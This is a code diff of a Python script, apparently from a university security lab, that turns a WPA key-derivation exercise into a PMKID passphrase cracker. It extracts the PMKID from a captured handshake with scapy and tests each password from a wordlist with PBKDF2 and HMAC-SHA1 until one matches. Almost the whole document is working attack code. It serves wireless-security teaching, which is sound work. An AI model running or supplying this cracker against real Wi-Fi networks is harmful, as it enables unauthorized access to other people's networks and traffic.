@@ -2,19 +2,13 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
-
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+Find the passphrase from the PMKID info
 """
 
-__author__ = "Abraham Rubinstein et Yann Lederrey"
-__modified__ = "Robin Müller et Stéphane Teixeira Carvalho"
+__author__ = "Robin Müller et Stéphane Teixeira Carvalho"
 __copyright__ = "Copyright 2017, HEIG-VD"
 __license__ = "GPL"
 __version__ = "1.0"
-__email__ = "abraham.rubinstein@heig-vd.ch"
 __status__ = "Prototype"
 
 from scapy.all import *
@@ -68,28 +62,30 @@ def getAssociationRequestInfo(packets):
     Clientmac = a2b_hex(pkt.addr2.replace(':', ''))
     return ssid, APmac, Clientmac
 
+
 def getHandshakeInfo(APmac, Clientmac, packets):
     """
-    Will get all useful values from the 4 way handshake packets.
+    Will get the PMKID from the first message of the 4 way handshake
     Handshake packets must be in order.
+    :param APmac: the mac address of the access point
+    :param Clientmac: the mac address of the client
     :param packets: the list of packets
     :return: the authenticator nonce, the supplicant nonce, the mic of the fourth message and the data of the fourth message
     """
     # Search for all the packets that have the layer WPA_key (This will return the 4 way handshake packets)
-    pkts = list(filter(lambda pkt: pkt.haslayer(WPA_key) and a2b_hex(pkt.addr1.replace(':', '')) == Clientmac and a2b_hex(pkt.addr2.replace(':', '')) == APmac, packets))
+    # and that have the same client mac as destination and the mac address of the access point as source
+    pkts = list(filter(lambda pkt: pkt.haslayer(WPA_key) and
+                                   a2b_hex(pkt.addr1.replace(':', '')) == Clientmac and
+                                   a2b_hex(pkt.addr2.replace(':', '')) == APmac, packets))
     # Get the WPA_layer of the packets found contains the value of the handshake
     handshakePkts = list(map(lambda pkt: pkt.getlayer(WPA_key), pkts))
-    # Authenticator and Supplicant Nonces
-    pmkid = handshakePkts[0].wpa_key[-16:]  # ANonce in first message of the handshake
-
+    # The PMID are the last 16 bytes of the content of the wpa_key in scapy
+    pmkid = handshakePkts[0].wpa_key[-16:]
     return pmkid
 
 def main():
     # Read capture file -- it contains beacon, authentication, association, handshake and data
     wpa = rdpcap("PMKID_handshake.pcap")
-
-    # Important parameters for key derivation - most of them can be obtained from the pcap file
-    passPhrase = "admin123"
 
     # Important parameters for key derivation - most of them can be obtained from the pcap file
     ssid, APmac, Clientmac = getAssociationRequestInfo(wpa)
@@ -98,12 +94,12 @@ def main():
 
     print("\n\nValues used to derivate keys")
     print("============================")
-    print("Passphrase: ", passPhrase, "\n")
     print("SSID: ", ssid, "\n")
     print("AP Mac: ", b2a_hex(APmac), "\n")
-    print("CLient Mac: ", b2a_hex(Clientmac), "\n")
+    print("Client Mac: ", b2a_hex(Clientmac), "\n")
     print("PMKID: ", pmkid.hex(), "\n")
 
+    # Encode the ssid as bytes
     ssid = str.encode(ssid)
 
     print("\nTrying to find passphrase")
@@ -112,13 +108,19 @@ def main():
     f = open('./wordlist.txt', 'r')
     # Read each line of the file. The line read will be the passphrase to test
     for passPhrase in f.read().splitlines():
-        # Encode the passphrase and the ssid as bytes
+        # Encode the passphrase
         passPhrase = str.encode(passPhrase)
-        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
         pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+        # Calculate the pmkid
         pmkid_test = hmac.new(pmk, pmk_name + APmac + Clientmac, hashlib.sha1)
+        # The sha-1 algorithm as 20 bytes as outputs but PMKID is only 16 bytes long
+        # So we only take the first 16 bytes
         if pmkid == pmkid_test.digest()[:16]:
-            print("Working passphrase : ", passPhrase.decode())
+            print("Working passphrase     : ", passPhrase.decode())
+            break
+        else:
+            print("Not working passphrase : ", passPhrase.decode())
 
 
 if __name__ == "__main__":
